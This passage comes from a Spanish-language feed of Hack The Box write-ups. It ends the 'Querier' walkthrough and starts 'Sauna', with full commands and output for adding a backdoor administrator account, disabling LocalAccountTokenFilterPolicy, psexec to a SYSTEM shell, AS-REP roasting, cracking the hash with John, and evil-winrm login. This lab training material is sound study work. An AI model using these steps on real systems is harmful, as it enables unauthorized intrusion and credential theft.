&lt;p&gt;Forma 1 – Crear un nuevo usuario y hacerlo administrador&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; net user paco paco123&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/add
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; net localgroup paco administrators /add
net.exe : System error 1376 has occurred.
    + CategoryInfo          : NotSpecified: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;System error 1376 has occurred.:String&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;, RemoteException
    + FullyQualifiedErrorId : NativeCommandError

The specified &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;group does not exist.

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; Add-LocalGroupMember &lt;span class=&quot;nt&quot;&gt;-Group&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Administrators&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Member&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;paco&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; net user paco
User name                    paco
Full Name
Comment
Users comment
Country/region code          000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;System Default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Account active               Yes
Account expires              Never

Password last &lt;span class=&quot;nb&quot;&gt;set            &lt;/span&gt;1/26/2022 7:38:06 PM
Password expires             3/9/2022 7:38:06 PM
Password changeable          1/27/2022 7:38:06 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      &lt;span class=&quot;s2&quot;&gt;&quot;*Administrators&quot;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Users
Global Group memberships     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;None
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Comprobacion con Crackmapexec para ver si tendriamos el usuario creado y con (Pwned)&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.125 -u &quot;paco&quot; -p &apos;paco123$&apos; -d WORKGROUP&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WORKGROUP&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;aco:paco123&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que la pass es validad pero no tendriamos posibilidad de conectarnos al no tener el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(Pwned)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Puede ocurrir que tengamos credenciales de administrador, pero no tengamos la capacidad de ejecutar comandos.
Esto puede ocurrir porque &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LocalAccountTokenFilterPolicy&lt;/code&gt; es un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filtro que previene&lt;/code&gt; que se usen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privilegios elevados&lt;/code&gt; a través de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;red&lt;/code&gt;. 
Solo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aplicaria&lt;/code&gt; para las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cuentas Administrativas Locales&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No afectan&lt;/code&gt; a las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cuentas de Dominios&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Para deshabilitar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LocalAccountTokenFilterPolicy&lt;/code&gt;, debemos retocar el siguiente registro&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;OFTWARE&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;icrosoft&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;urrentVersion&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;olicies&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procemos a hacerlo&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; reg add HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;urrentVersion&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
The operation completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Recomprobamos con la herramienta Crackmapexec&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.125 -u &quot;paco&quot; -p &apos;paco123$&apos; -d WORKGROUP&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WORKGROUP&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;aco:paco123&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;post-explotacion-atraves-de-usuario-nuevo-creado-paco&quot;&gt;Post Explotacion atraves de Usuario Nuevo Creado Paco&lt;/h1&gt;
&lt;p&gt;Usando la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# psexec.py &apos;WORKGROUP/paco:paco123$&apos;@10.10.10.125&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.10.10.125.....
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file pSzSoFOo.exe
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.10.10.125.....
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service SWYm on 10.10.10.125.....
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service SWYm.....
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17763.292]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2018 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Rooteda - Surf3rH4ck - K0H4ck&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="SmbClient," /><category term="SmbMap," /><category term="Enumeracion," /><category term="Olevba" /><category term="Archivos" /><category term="Excel," /><category term="Myssql-Server," /><category term="Mssqlclient," /><category term="Sqsh," /><category term="Xp_dirtree," /><category term="Xp_CmdShell," /><category term="RCE," /><category term="Nishang," /><category term="PowerUp," /><category term="Maquinas" /><category term="Retiradas," /><category term="Post-Explotacion." /><summary type="html">Querier ~ Hack The Box</summary></entry><entry><title type="html">Maquina Retirada Sauna AD de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/01/04/Sauna.html" rel="alternate" type="text/html" title="Maquina Retirada Sauna AD de Hack The Box (Necesario VIP)" /><published>2022-01-04T00:00:00-03:00</published><updated>2022-01-04T00:00:00-03:00</updated><id>http://localhost:4000/2022/01/04/Sauna</id><content type="html" xml:base="http://localhost:4000/2022/01/04/Sauna.html">&lt;h1 id=&quot;sauna-ad--hack-the-box&quot;&gt;Sauna AD ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.10.175       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-01-02 00:47:13Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m02s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-01-02T00:48:04
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a enumerar el puerto 80 y ver que hay a nivel WEB para enumerar posibles Usuarios a nivel del Dominio encontrado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EGOTISTICAL-BANK.LOCAL&lt;/code&gt; 
Introducimos el Dominio en nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Encontramos unos posibles usuarios Validos a nivel web, procedo a montarme un Diccionario para preoceder a realizar un ASREP-Roast Attack 
Para ello utilizaremos la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetNPUsers.py&lt;/code&gt; mas a delante.&lt;/p&gt;

&lt;p&gt;Procedemos a montarnos un archivo con los Nombres de los Usuarios Encontrados&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat diccionario_users                                                                                                                                                                                      1 ⚙&lt;/span&gt;
Fergus Smith
Shaun Coins
Bowie Taylor 
Sophie Driver
Steven Kerb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ahora procedemos a hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Username-Anarchy&lt;/code&gt; para crear distintas variaciones en los nombre de usuario a nivel del diccionario_users.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ./username-anarchy --input-file diccionario_users  --select-format first,flast,first.last,firstl&lt;/span&gt;
fergus
fergus.smith
ferguss
fsmith
shaun
shaun.coins
shaunc
scoins
bowie
bowie.taylor
bowiet
btaylor
sophie
sophie.driver
sophied
sdriver
steven
steven.kerb
stevenk
skerb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Redirigimos el contenido de usuarios nuevos creados a el Archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;diccionario_users.modifed&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;asreproasting-attack&quot;&gt;ASREPRoasting Attack&lt;/h1&gt;

&lt;p&gt;Paso 1 - Tener un diccionario Creado con posibles Usuarios para realizar el ataque
Paso 2 - Realizar el Ataque con la siguiente estructura modificando el Dominio y Diccionario a usar&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile ../nmap/diccionario_users.modified      &lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$krb5asrep$23$fsmith&lt;/span&gt;@EGOTISTICAL-BANK.LOCAL:847325b2e10c33d2ae7b40c82a74ff56&lt;span class=&quot;nv&quot;&gt;$7f6c655697711e9b3e7d75f09a12d53e1b521549fd5704bf&lt;/span&gt;
bdeb5fa321b54f2a115dee82fbc6d9dcd6526a31e44b5701a39574897418052dd9062a21db7aebe7ad0f5b63a05ef041053cfa2e03bc0caa058044cd2caf8
89023bcf1b3a0aa0f3eef4c6425f4e37f9e4d2d3fcbde5dfd462cc11bd19a168c81239e9dfafb0530b8c87321497389afcef5dc573142acef0b14a2b0a161
d182e665c760814e73e13a8a4cb8fc0fe61dc4c164a598d0adf5d95f616fe8c46dd5deae459f703e1c42392eefc9912258061dbd0676f054279cbbb1d457a
daf0a64b196f1f47249b3a6de3c43c15b6d734e888a884d4a9b5bcbbf533d6895403bbd692f69b59b743ea83c
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que obtenemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HASH&lt;/code&gt; que podemos proceder a Crackear conm la herramienta John&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# john --wordlist=/usr/share/wordlists/rockyou.txt hash&lt;/span&gt;
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5asrep, Kerberos 5 AS-REP etype 17/18/23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 8 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
&lt;span class=&quot;s2&quot;&gt;&quot;Thestrokes23&quot;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$krb5asrep$23&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;$&quot;fsmith&quot;&lt;/span&gt;@EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:04 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2022-01-04 15:51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.2232g/s 2352Kp/s 2352Kc/s 2352KC/s Tiffani143..Thehulk2008
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Obtenemos Credenciales&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fsmith: Thestrokes23
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a Validar con Crackmapexec el usuario y la password tanto para SMB como para WINRM&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23                   &lt;/span&gt;
SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SAUNA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;smith:Thestrokes23

&lt;span class=&quot;c&quot;&gt;# crackmapexec winrm 10.10.10.175 -u fsmith -p Thestrokes23&lt;/span&gt;
WINRM       10.10.10.175    5985   SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SAUNA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
WINRM       10.10.10.175    5985   SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;smith:Thestrokes23 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a conectarnos como el usuario fsmith con la Herramienta Evil-winrm&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# evil-winrm -i 10.10.10.175 -u fsmith -p &apos;Thestrokes23&apos;                   &lt;/span&gt;

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

